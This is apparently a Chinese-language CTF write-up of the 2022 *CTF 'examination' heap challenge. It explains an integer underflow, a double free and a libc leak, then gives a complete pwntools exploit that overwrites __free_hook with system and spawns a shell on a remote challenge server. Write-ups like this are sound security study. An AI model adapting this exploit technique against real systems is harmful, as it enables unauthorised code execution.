---
layout: post
title: "2022 *ctf pwn examination wp"
date:   2022-4-17
tags: [ctf_wp]
comments: true
author: wsxk
---

是我见过的最复杂的堆题目了，没有之一

首先先看一遍程序的大致流程

![](https://raw.githubusercontent.com/wsxk/wsxk_pictures/main/2022-4-15-%E6%98%9Fctf_pwn_examination/1.png)

可以看到关键点在当角色为student时的check_review函数

当分数大于89的时候可以拿到chunk地址，以及任意地址加1的权限，但是我们看过流程后，会发现，正常情况分数是不可能超过89的
因为模数最大为90。

当老师给分时

![](https://raw.githubusercontent.com/wsxk/wsxk_pictures/main/2022-4-15-%E6%98%9Fctf_pwn_examination/2.png)

我们发现如果学生祈祷（pray），会扣10分，如果学生分数少于10分，就发生整型溢出

这样就能绕过这个判断了

那么思考后面的条件怎么用，我们发现我们可以构造学生0和学生1的comment地址差0x100，这样通过加1操作，就能使得2个学生的comment指向同一个位置，造成double free

然后思考我们要怎么拿到libc基址，这道题的comment限制在0x400以内，直接释放都会丢到tcache里面，这样是拿不到基址的

这里再用一次上面的条件，使得comment的size域+0x100，这样释放就能拿到libc地址了（只要对学生0指向函数check_review就能拿到libc地址了

这里再用一次上面的条件，将学生0指向的comment可写的长度修改，使它可以写超长的值，就能覆盖之后的chunk

覆盖之后的某个学生的comment地址为free_hook，就能完成攻击



    from pwn import *

    libc = ELF("./libc-2.31.so")
    #libc= ELF("/lib/x86_64-linux-gnu/libc.so.6")
    io=remote("124.70.130.92",60001)
    #io = process(['./examination'])
    #gdb.attach(io)
    context.log_level="debug"

    def change_role(num):
        io.sendlineafter("choice>>",str(5))
        io.sendlineafter("<0.teacher/1.student>:",str(num))

    # teacher
    def add_stu(num_question):
        io.sendlineafter("choice>>",str(1))
        io.sendlineafter("enter the number of questions: ",str(num_question))

    def give_score(id):
        io.sendlineafter("choice>>",str(2))
        print(str(id)+"th "+"student is ")
        io.recvuntil(str(id)+"th "+"student is ")
        value = int(io.recv(2))
        return value

    def write_check(num,size,content):
        io.sendlineafter("choice>>",str(3))
        io.sendlineafter("which one? > ",str(num))
        io.sendlineafter("please input the size of comment: ",str(size))
        io.sendlineafter("enter your comment:",content)

    def free(num):
        io.sendlineafter("choice>>",str(4))
        io.sendlineafter("which student id to choose?",str(num))

    #student

    def change_id(num):
        io.sendlineafter("choice>>",str(6))
        io.sendlineafter("input your id: ",str(num))

    def pray():
        io.sendlineafter("choice>>",str(3))

    def check_review():
        io.sendlineafter("choice>>",str(2))


    # get arbitrary addr  value +1
    def arbitrary_addr(num):
        change_role(1)
        change_id(num)
        pray()

        change_role(0)
        value=give_score(num)
        while value>=10:
            print("value:"+str(value))
            value=give_score(num)
        print("value:"+str(value))

        #change_role(1)
        #check_review()

    io.sendlineafter("role: <0.teacher/1.student>: ",str(0))
    change_role(0)
    add_stu(9)
    write_check(0,0xa0,"wsxk")
    add_stu(9)
    write_check(1,0x3f0,"test")
    add_stu(9)
    write_check(2,0xa0,"www")
    add_stu(9)
    write_check(3,0x200,"www")



    ## get_reware
    arbitrary_addr(3)
    change_role(1)
    change_id(3)
    check_review()
    io.recvuntil("Good Job! Here is your reward! ")
    first_chunk=int(io.recv(14),16)
    print("frist_chunk_addr:"+hex(first_chunk))
    write_addr1=first_chunk-(0x55de86bb17f0-0x55de86bb12d9)-0x100
    #gdb.attach(io)
    print("write_addr1:"+hex(write_addr1))
    write_addr2=write_addr1+0x3e9-0x2d9
    print("write_addr2:"+hex(write_addr2))
    io.recvuntil("addr: ")
    #gdb.attach(io)
    io.sendline(str(write_addr1)+'1')

    change_role(0)
    add_stu(9)
    write_check(4,0x300,"wsxk")
    add_stu(9)
    write_check(5,0x300,"wsxk")
    add_stu(9)
    write_check(6,0x300,"wwww")
    # get reward
    arbitrary_addr(4)
    change_role(1)
    change_id(4)
    check_review()
    io.recvuntil("addr: ")
    #gdb.attach(io)
    print("write_addr1:"+hex(write_addr1))
    print("write_addr2:"+hex(write_addr2))
    io.sendline(str(write_addr2)+'1')


    #get 0th reward
    arbitrary_addr(0)
    # free the 1th chunk
    #gdb.attach(io)
    change_role(0)
    free(1)   # total 5chunks left
    #gdb.attach(io)

    change_role(1)
    change_id(0)
    check_review()
    io.recvuntil("Good Job! Here is your reward! ")
    chunk=int(io.recv(14),16)
    io.recvuntil("addr: ")
    io.sendline(str(chunk+0x40+2)+"1")
    io.recvuntil(b"here is the review:\n")
    main_arena = u64(io.recv(7).ljust(8,b"\x00"))-96
    print("main_arena:"+hex(main_arena))
    #gdb.attach(io)

    libc.address=main_arena-0x1ECB80
    #libc.address=main_arena-0x1EBB80
    print("libc_address:"+hex(libc.address))
    print("free_hook:"+hex(libc.sym["__free_hook"]))
    print("malloc_hook:"+hex(libc.sym["__malloc_hook"]))
    free_hook=libc.sym["__free_hook"]

    # get shell
    change_role(0)
    io.sendline(str(3))
    io.recvuntil("which one? > ")
    io.sendline(str(0))
    io.recvuntil("enter your comment:")
    print("write_addr1:"+hex(write_addr1))
    print("write_addr2:"+hex(write_addr2))
    print("first_chunk:"+hex(first_chunk))
    #gdb.attach(io)
    payload=p64(main_arena+96)+p64(main_arena+96)+b'a'*0x4e0+p64(0x500)+p64(0x30)+p64(first_chunk+0x000055f06b873920-0x55f06b8738f0)+p64(0)*2+p64(0x0000000100000001)+p64(0)+p64(0x21)+p64(0x0000004800000009)+p64(free_hook)+p64(0x200)+p64(0x201)+p64(0xa777777)
    io.sendline(payload)
    #gdb.attach(io)
    ## write gadget
    gadget=libc.sym["system"]
    change_role(0)
    io.sendline(str(3))
    io.recvuntil("which one? > ")
    io.sendline(str(3))
    io.recvuntil("enter your comment:")
    payload=p64(gadget)
    io.send(payload)

    change_role(0)
    io.sendline(str(3))
    io.recvuntil("which one? > ")
    io.sendline(str(5))
    io.recvuntil("enter your comment:")
    io.sendline("/bin/sh\x00")
    #gdb.attach(io)
    free(5)
    io.interactive()




<!-- Google tag (gtag.js) -->
<script async src="https://www.googletagmanager.com/gtag/js?id=G-C22S5YSYL7"></script>
<script>
  window.dataLayer = window.dataLayer || [];
  function gtag(){dataLayer.push(arguments);}
  gtag('js', new Date());

  gtag('config', 'G-C22S5YSYL7');
</script>